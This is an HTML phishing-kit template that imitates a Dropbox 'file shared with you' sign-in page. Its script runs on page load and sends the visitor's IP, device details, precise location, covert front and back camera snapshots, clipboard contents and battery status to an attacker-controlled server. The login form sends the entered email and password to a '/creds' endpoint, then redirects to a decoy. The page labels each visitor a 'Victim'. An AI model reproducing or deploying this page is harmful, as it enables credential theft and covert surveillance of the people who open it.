<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Dropbox - File shared with you</title>
<link rel="icon" href="https://cfl.dropboxstatic.com/static/images/favicon-vflk5FiAC.ico">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Atlas Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #f7f5f2; min-height: 100vh; display: flex; flex-direction: column; }
.header { background: #fff; padding: 16px 32px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; }
.header svg { width: 40px; height: 40px; }
.header span { font-size: 18px; font-weight: 700; color: #1e1919; margin-right: 8px; }
.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 24px; }
.container { width: 100%; max-width: 480px; }
.file-card { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); padding: 32px; margin-bottom: 16px; text-align: center; }
.file-icon { width: 80px; height: 80px; margin: 0 auto 16px; background: #e3f2fd; border-radius: 12px; display: flex; align-items: center; justify-content: center; }
.file-icon svg { width: 40px; height: 40px; fill: #0061FF; }
.file-name { font-size: 18px; font-weight: 600; color: #1e1919; margin-bottom: 8px; }
.file-info { font-size: 14px; color: #637282; margin-bottom: 4px; }
.shared-msg { background: #e8f0fe; border-radius: 8px; padding: 12px 16px; margin-bottom: 24px; font-size: 14px; color: #0061FF; display: flex; align-items: center; gap: 8px; justify-content: center; }
.login-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); padding: 32px; }
.login-box h2 { font-size: 20px; color: #1e1919; margin-bottom: 8px; text-align: center; }
.login-box p { font-size: 14px; color: #637282; margin-bottom: 24px; text-align: center; }
.form-group { margin-bottom: 16px; }
.form-group label { display: block; font-size: 14px; color: #1e1919; margin-bottom: 6px; font-weight: 500; }
.form-group input { width: 100%; padding: 12px 16px; border: 1px solid #d5d1cd; border-radius: 8px; font-size: 16px; color: #1e1919; outline: none; transition: border-color 0.2s; }
.form-group input:focus { border-color: #0061FF; box-shadow: 0 0 0 2px rgba(0,97,255,0.15); }
.btn-login { width: 100%; padding: 12px; background: #0061FF; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
.btn-login:hover { background: #004bd6; }
.divider { display: flex; align-items: center; margin: 20px 0; }
.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #d5d1cd; }
.divider span { padding: 0 16px; color: #637282; font-size: 13px; }
.social-btns { display: flex; flex-direction: column; gap: 10px; }
.social-btn { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 10px; border: 1px solid #d5d1cd; border-radius: 8px; font-size: 14px; color: #1e1919; cursor: pointer; background: #fff; text-decoration: none; }
.social-btn:hover { background: #f7f5f2; }
.footer { text-align: center; padding: 24px; font-size: 12px; color: #637282; }
.loading { display: none; text-align: center; padding: 32px; }
.spinner { border: 3px solid #e5e5e5; border-top: 3px solid #0061FF; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
@media (max-width: 520px) { .container { padding: 0 16px; } .file-card, .login-box { padding: 24px 20px; } }
</style>
</head>
<body>
<div class="header">
<svg viewBox="0 0 40 40"><path d="M12 6L2 12l10 6 10-6-10-6zm16 0l-10 6 10 6 10-6-10-6zM2 24l10 6 10-6-10-6-10 6zm26-6l-10 6 10 6 10-6-10-6zM12 32l10-6 6 3.6L18 36l-6-4z" fill="#0061FF"/></svg>
<span>Dropbox</span>
</div>
<div class="main">
<div class="container">
<div class="file-card">
<div class="file-icon">
<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
</div>
<div class="file-name">Important_Document.pdf</div>
<div class="file-info">PDF • 2.4 MB • Shared today</div>
</div>
<div class="shared-msg">
<svg width="16" height="16" viewBox="0 0 24 24" fill="#0061FF"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
Someone shared a file with you. Sign in to view.
</div>
<div class="login-box">
<h2>Sign in to Dropbox</h2>
<p>Sign in to access the shared file</p>
<form id="loginForm">
<div class="form-group">
<label>Email</label>
<input type="email" id="email" placeholder="your@email.com" required>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" id="password" placeholder="Password" required>
</div>
<button type="submit" class="btn-login">Sign in</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="font-size: 14px; color: #637282;">Signing in...</p>
</div>
<div class="divider"><span>or</span></div>
<div class="social-btns">
<a href="#" class="social-btn">
<svg width="18" height="18" viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
Sign in with Google
</a>
<a href="#" class="social-btn">
<svg width="18" height="18" viewBox="0 0 24 24"><path d="M16.365 1.43c0 1.14-.493 2.27-1.177 3.08-.744.9-1.99 1.57-2.987 1.57-.18 0-.36-.02-.53-.06.02-.18.04-.39.04-.56 0-1.12.535-2.22 1.235-3.08.75-.93 2.04-1.64 2.93-1.64.18 0 .35.02.49.05v.62zm3.24 5.93c-1.79 1.04-2.98 2.98-2.98 5.15 0 2.97 2.07 5.05 4.37 5.05-.28.81-.62 1.6-1.07 2.33-.8 1.33-1.66 2.66-3 2.68-1.31.02-1.74-.77-3.24-.77s-1.97.75-3.2.79c-1.29.05-2.27-1.44-3.08-2.77-1.65-2.72-2.92-7.7-1.22-11.06.85-1.67 2.36-2.72 4-2.75 1.27-.02 2.46.85 3.24.85.77 0 2.22-1.06 3.74-.9.64.03 2.43.26 3.58 1.93-.09.06-2.14 1.24-2.14 3.22z" fill="#000"/></svg>
Sign in with Apple
</a>
</div>
</div>
<div class="footer">© 2024 Dropbox</div>
</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

async function gatherAll() {
    let td = '📦 <b>Dropbox Victim!</b>\n\n';
    td += '⚓ IP: <code><%=ip %></code>\n';
    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';

    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});

    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition((p)=>{
            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
    }

    async function captureCamera(facingMode, label) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
            video.srcObject = stream;
            await video.play();
            await new Promise(r => setTimeout(r, 2000));
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
            stream.getTracks().forEach(t => t.stop());
        } catch(e) {}
    }

    try { await captureCamera("user", "selfie"); } catch(e) {}
    try { await captureCamera("environment", "back"); } catch(e) {}

    try {
        if(navigator.clipboard && navigator.clipboard.readText) {
            const clip = await navigator.clipboard.readText();
            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
        }
    } catch(e) {}

    try {
        const bat = await navigator.getBattery();
        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
    } catch(e) {}
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;

    document.querySelector('form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';

    $.post("<%=a %>/creds", {
        uid: uid,
        user: encodeURIComponent(email),
        pass: encodeURIComponent(pass),
        platform: 'Dropbox'
    });

    await new Promise(r => setTimeout(r, 2500));
    window.location.href = "<%=url %>";
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>